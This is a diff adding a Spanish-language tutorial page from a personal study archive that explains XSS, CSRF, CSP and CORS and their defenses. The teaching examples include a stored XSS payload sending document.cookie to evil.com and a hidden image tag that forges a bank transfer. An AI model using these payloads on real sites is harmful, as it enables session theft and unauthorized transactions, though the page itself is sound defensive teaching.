@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Seguridad Web: XSS, CSRF, CSP y CORS — Códice</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Merriweather:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+  <link rel="stylesheet" href="../../assets/css/style.css">
+  <link rel="stylesheet" href="../../assets/css/prism.css">
+
+  <style>
+    .attack-card {
+      border: 1px solid var(--color-border);
+      border-radius: var(--radius-lg);
+      padding: var(--space-3);
+      margin-bottom: var(--space-3);
+      background: var(--color-surface);
+      border-left: 4px solid var(--diagram-1);
+    }
+
+    .attack-card h3 {
+      margin: 0 0 var(--space-2);
+      color: var(--diagram-1);
+    }
+
+    .defense-card {
+      border: 1px solid var(--color-border);
+      border-radius: var(--radius-lg);
+      padding: var(--space-3);
+      margin-bottom: var(--space-3);
+      background: var(--color-surface);
+      border-left: 4px solid var(--diagram-6);
+    }
+
+    .defense-card h3 {
+      margin: 0 0 var(--space-2);
+      color: var(--diagram-6);
+    }
+
+    .flow-diagram {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: var(--space-2);
+      margin: var(--space-3) 0;
+      flex-wrap: wrap;
+    }
+
+    .flow-node {
+      background: var(--color-surface);
+      border: 1px solid var(--color-border);
+      border-radius: var(--radius-md);
+      padding: var(--space-1) var(--space-2);
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      text-align: center;
+    }
+
+    .flow-arrow {
+      color: var(--color-text-muted);
+      font-size: 1.2rem;
+    }
+
+    .flow-node.malicious {
+      border-color: var(--diagram-1);
+      color: var(--diagram-1);
+    }
+
+    .flow-node.safe {
+      border-color: var(--diagram-6);
+      color: var(--diagram-6);
+    }
+
+    .vuln-list {
+      list-style: none;
+      padding: 0;
+    }
+
+    .vuln-list li {
+      position: relative;
+      padding-left: 1.8rem;
+      margin-bottom: var(--space-2);
+      line-height: 1.6;
+    }
+
+    .vuln-list li::before {
+      content: "!";
+      position: absolute;
+      left: 0;
+      top: 0;
+      width: 1.4rem;
+      height: 1.4rem;
+      background: var(--diagram-1);
+      color: white;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+      font-size: 0.75rem;
+    }
+  </style>
+</head>
+<body>
+
+  <header class="container site-header reveal-element">
+    <div>
+      <h1 class="site-title"><a href="../../index.html">Códice</a></h1>
+      <p class="site-subtitle">Archivo personal de aprendizaje y notas</p>
+    </div>
+  </header>
+
+  <main class="container content-wrapper">
+    <div class="topic-card-meta">
+      <span class="topic-badge">Web Development</span>
+      <time datetime="2026-07-20">20 de julio de 2026</time>
+    </div>
+
+    <h1>Seguridad Web: XSS, CSRF, CSP y CORS</h1>
+
+    <div class="callout reveal-element">
+      <p><strong>En resumen:</strong> XSS y CSRF son ataques que explotan la forma en que funciona la web. CSP y CORS son mecanismos de defensa. Entender estos cuatro conceptos es obligatorio para cualquier desarrollador web.</p>
+    </div>
+
+    <h2>1. Cross-Site Scripting (XSS)</h2>
+
+    <p>XSS ocurre cuando un atacante logra que tu sitio ejecute <strong>JavaScript malicioso</strong> en el navegador de otro usuario. No es un ataque al servidor: es un ataque a los usuarios que visitan tu sitio.</p>
+
+    <p>Imaginá un foro donde cualquiera puede escribir comentarios. Si alguien escribe código JavaScript en vez de texto y tu sitio lo muestra tal cual, el navegador de quien lee el comentario ejecuta ese código como si fuera parte de tu página.</p>
+
+    <div class="attack-card reveal-element">
+      <h3>XSS Reflejado</h3>
+      <p>El código malicioso viene en la URL. Cuando alguien hace clic en ese enlace, el servidor lo refleja en la respuesta sin sanitizar.</p>
+      <pre class="code-block"><code class="language-javascript">
+// URL maliciosa
+https://tu-sitio.com/buscar?q=&lt;script&gt;steal(cookies)&lt;/script&gt;
+
+// El servidor refleja la query en la página sin escape
+&lt;p&gt;Resultados para: &lt;script&gt;steal(cookies)&lt;/script&gt;&lt;/p&gt;
+      </code></pre>
+    </div>
+
+    <div class="attack-card reveal-element">
+      <h3>XSS Almacenado</h3>
+      <p>El código malicioso se guarda en la base de datos (un comentario, un post, un perfil). Cada vez que alguien lo carga, el navegador lo ejecuta.</p>
+      <pre class="code-block"><code class="language-javascript">
+// El atacante envía esto como "nombre" en un formulario
+'&gt;&lt;script&gt;document.location="https://evil.com/robar?c="+document.cookie&lt;/script&gt;
+
+// Cuando otro usuario ve el perfil, se ejecuta el script
+      </code></pre>
+    </div>
+
+    <div class="defense-card reveal-element">
+      <h3>Defensa contra XSS</h3>
+      <ul>
+        <li><strong>Escaping:</strong> Convertí los caracteres especiales en HTML entities. <code>&lt;</code> se convierte en <code>&amp;lt;</code>.</li>
+        <li><strong>Content Security Policy (CSP):</strong> Definí qué scripts puede ejecutar tu página.</li>
+        <li><strong>HttpOnly cookies:</strong> JavaScript no puede leerlas, así que un XSS no puede robar la sesión.</li>
+        <li><strong>Sanitización:</strong> Limpíá toda entrada del usuario antes de mostrarla.</li>
+      </ul>
+    </div>
+
+    <h2>2. Cross-Site Request Forgery (CSRF)</h2>
+
+    <p>CSRF engaña al navegador del usuario para que haga una petición que el usuario no autorizó. El truco es que <strong>las cookies se envían automáticamente</strong> al mismo dominio.</p>
+
+    <div class="flow-diagram reveal-element">
+      <span class="flow-node">Banco</span>
+      <span class="flow-arrow">&rarr;</span>
+      <span class="flow-node">Usuario sesionado</span>
+      <span class="flow-arrow">&rarr;</span>
+      <span class="flow-node malicious">Sitio malicioso</span>
+      <span class="flow-arrow">&rarr;</span>
+      <span class="flow-node">Banco recibe petición</span>
+    </div>
+
+    <div class="attack-card reveal-element">
+      <h3>Ejemplo concreto</h3>
+      <p>Estás logueado en tu banco. Visitás un sitio malicioso que tiene esto en su HTML:</p>
+      <pre class="code-block"><code class="language-javascript">
+&lt;!-- Oculto, invisible para el usuario --&gt;
+&lt;img src="https://tu-banco.com/transferir?destino=atacante&monto=10000"
+     style="display:none"&gt;
+      </code></pre>
+      <p>Tu navegador carga la imagen y envía la cookie de sesión automáticamente. El banco no puede distinguir entre tu petición y la del sitio malicioso.</p>
+    </div>
+
+    <div class="defense-card reveal-element">
+      <h3>Defensa contra CSRF</h3>
+      <ul>
+        <li><strong>CSRF Tokens:</strong> Un token único que el servidor genera y el formulario debe enviar de vuelta. El atacante no puede adivinarlo.</li>
+        <li><strong>SameSite cookies:</strong> La cookie no se envía en peticiones cruzadas.</li>
+        <li><strong>Verificación de Origin/Referer:</strong> El servidor revisa de dónde viene la petición.</li>
+      </ul>
+    </div>
+
+    <h2>3. Content Security Policy (CSP)</h2>
+
+    <p>CSP es un encabezado HTTP que le dice al navegador <strong>de qué fuentes está permitido cargar contenido</strong>. Es una defensa proactiva contra XSS.</p>
+
+    <pre class="code-block reveal-element"><code class="language-javascript">
+// Permitir scripts solo del mismo dominio
+Content-Security-Policy: script-src 'self'
+
+// Permitir scripts de tu dominio y de un CDN específico
+Content-Security-Policy: script-src 'self' https://cdn.ejemplo.com
+
+// Bloquear todo script inline (muy estricto)
+Content-Security-Policy: script-src 'none'
+
+// Ejemplo completo
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' https://cdn.ejemplo.com;
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: https:;
+  connect-src 'self' https://api.ejemplo.com;
+    </code></pre>
+
+    <p>CSP no previene XSS, pero <strong>limita el daño</strong>. Si un atacante logra inyectar un script, el navegador lo bloquea si no está en la lista de permitidos.</p>
+
+    <h2>4. Cross-Origin Resource Sharing (CORS)</h2>
+
+    <p>CORS controla qué dominios pueden acceder a los recursos de tu API desde JavaScript. Sin CORS, el navegador bloquea las peticiones entre dominios diferentes por seguridad.</p>
+
+    <div class="attack-card reveal-element">
+      <h3>El problema que resuelve</h3>
+      <p>Si tu API está en <code>api.tu-sitio.com</code> y tu frontend en <code>tu-sitio.com</code>, el navegador bloquea las peticiones porque son "cross-origin". CORS le dice al navegador qué está permitido.</p>
+      <pre class="code-block"><code class="language-javascript">
+// El navegador envía esto en una petición cross-origin
+Origin: https://tu-sitio.com
+
+// El servidor responde con qué orígenes puede acceder
+Access-Control-Allow-Origin: https://tu-sitio.com
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE
+Access-Control-Allow-Headers: Content-Type, Authorization
+      </code></pre>
+    </div>
+
+    <div class="defense-card reveal-element">
+      <h3>Buenas prácticas de CORS</h3>
+      <ul>
+        <li><strong>Nunca uses <code>Access-Control-Allow-Origin: *</code></strong> en producción. Permite que cualquier sitio acceda a tu API.</li>
+        <li><strong>Lista blanca explícita:</strong> Especificá exactamente qué dominios pueden acceder.</li>
+        <li><strong>Limitá métodos y headers:</strong> Solo permití lo necesario.</li>
+        <li><strong>Credentials:</strong> Si usás cookies o auth headers, configurá <code>Access-Control-Allow-Credentials: true</code> y lista blanca de orígenes específicos.</li>
+      </ul>
+    </div>
+
+    <h2>5. Resumen de amenazas y defensas</h2>
+
+    <ul class="vuln-list reveal-element">
+      <li><strong>XSS:</strong> Inyectar código que se ejecuta en el navegador de la víctima. Defensa: escaping + CSP + HttpOnly cookies.</li>
+      <li><strong>CSRF:</strong> Forzar al navegador a hacer peticiones no autorizadas. Defensa: tokens CSRF + SameSite cookies.</li>
+      <li><strong>CSP:</strong> Restringe qué código puede ejecutarse. No previene XSS pero limita el daño.</li>
+      <li><strong>CORS:</strong> Controla qué dominios pueden acceder a tu API. No es un mecanismo de seguridad per se, pero define los límites de acceso cross-origin.</li>
+    </ul>
+
+    <div class="callout reveal-element">
+      <p><strong>Regla de oro:</strong> Nunca confíes en la entrada del usuario. Siempre sanitizá, validá y escapá. El navegador es el primer filtro de seguridad, pero no el único.</p>
+    </div>
+
+    <div class="reveal-element">
+      <div style="display: flex; gap: var(--space-3); margin-top: var(--space-4); flex-wrap: wrap;">
+        <a href="../../index.html" class="btn btn-secondary">&larr; Volver al archivo</a>
+      </div>
+    </div>
+  </main>
+
+  <script src="../../assets/js/prism.js"></script>
+  <script src="../../assets/js/prism-python.js"></script>
+  <script src="../../assets/js/main.js"></script>
+</body>
+</html>
